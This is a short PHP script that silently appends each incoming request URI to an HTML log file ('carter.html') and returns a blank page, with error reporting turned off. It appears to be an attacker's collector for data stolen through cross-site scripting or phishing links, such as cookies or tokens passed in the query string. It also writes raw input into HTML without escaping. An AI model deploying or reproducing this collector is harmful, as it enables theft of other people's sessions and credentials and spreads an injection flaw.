<?php
error_reporting(0);
$data=$_SERVER['REQUEST_URI'];
	    $open = fopen("carter.html",'a') or die ('Fail');
        fputs($open,"<br>// Guy ----------------------------<br>");
        fputs($open,$data."<br>");
        fputs($open,"<br>//-----------------------------------<br>");
	    fclose($open);

echo "";